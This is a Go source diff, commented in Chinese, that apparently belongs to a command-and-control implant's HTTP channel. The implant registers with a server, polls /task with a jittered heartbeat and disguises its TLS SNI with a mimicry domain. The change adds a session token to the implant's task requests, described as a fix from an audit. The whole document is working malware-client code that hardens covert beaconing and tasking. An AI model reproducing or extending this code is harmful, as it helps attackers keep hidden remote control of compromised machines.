@@ -13,6 +13,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -37,6 +38,53 @@ import (
 
 // httpMode 全局标记：true 时 sendPacketSync 走 HTTP POST（httpPollRun 设置）。
 var httpMode bool
+
+// ─── 会话令牌（审计 M2）──────────────────────────────────────────────────
+// 服务端在注册响应里下发 session_token；之后所有按 session_id 拉数据的
+// GET（/task 以及同类端点）都必须带 token=<...>，否则服务端一律 403。
+//
+// 只存内存：重连/重新注册会拿到新令牌（服务端每次注册都覆盖），旧令牌立即
+// 失效。令牌为空时也照样拼 token= —— 服务端必须拒绝空令牌，客户端不能
+// fail-open（"没有令牌就不带、服务端当匿名放行"是最坏的兼容方向）。
+var (
+	httpTokenMu      sync.RWMutex
+	httpSessionToken string
+)
+
+func setHTTPSessionToken(token string) {
+	httpTokenMu.Lock()
+	httpSessionToken = token
+	httpTokenMu.Unlock()
+}
+
+func getHTTPSessionToken() string {
+	httpTokenMu.RLock()
+	defer httpTokenMu.RUnlock()
+	return httpSessionToken
+}
+
+// isSessionAuthPath 判断某端点是否属于"用 session_id 鉴权、必须带会话令牌"
+// 的拉取端点（/task 以及后续可能新增的同类 GET）。
+func isSessionAuthPath(path string) bool {
+	base := path
+	if i := strings.IndexByte(base, '?'); i >= 0 {
+		base = base[:i]
+	}
+	base = strings.TrimSuffix(base, "/")
+	return base == "task" || strings.HasSuffix(base, "/task")
+}
+
+// httpAuthPath 给需要会话令牌的端点追加 token 查询参数（保留已有查询串）。
+func httpAuthPath(path string) string {
+	if !isSessionAuthPath(path) {
+		return path
+	}
+	sep := "?"
+	if strings.Contains(path, "?") {
+		sep = "&"
+	}
+	return path + sep + "token=" + url.QueryEscape(getHTTPSessionToken())
+}
 
 // httpSharedClient 返回复用的 HTTP 客户端（连接池，SNI 使用拟态域名）。
 // 实现按 build 标签二选一（transport_tls_std.go / transport_tls_utls.go）：
@@ -89,6 +137,9 @@ func httpC2Request(client *http.Client, base, path string, p *Packet) (*Packet, 
 		return nil, err
 	}
 
+	// 审计 M2：按 session_id 拉数据的端点（/task 等）统一在此追加会话令牌，
+	// 避免将来新增调用点漏带 token。
+	path = httpAuthPath(path)
 	req, err := http.NewRequest("POST", base+path, bytes.NewReader(body))
 	if err != nil {
 		return nil, err
@@ -311,8 +362,20 @@ func httpPollRun() {
 	base := httpBaseURL(serverAddr)
 
 	// 注册（失败即返回，等待主循环重连）
-	if _, err := httpC2Request(client, base, "register", buildRegisterPacket()); err != nil {
+	ack, err := httpC2Request(client, base, "register", buildRegisterPacket())
+	if err != nil {
 		return
+	}
+	// 审计 M2：保存注册响应下发的会话令牌，之后 /task 拉取必须带上。
+	// 服务端每次注册都会覆盖旧令牌，因此重连后以最新响应为准。
+	if ack != nil && len(ack.Payload) > 0 {
+		var regResp struct {
+			Status       string `json:"status"`
+			SessionToken string `json:"session_token"`
+		}
+		if json.Unmarshal(ack.Payload, &regResp) == nil && regResp.SessionToken != "" {
+			setHTTPSessionToken(regResp.SessionToken)
+		}
 	}
 
 	hbInterval := jitteredInterval(interval)
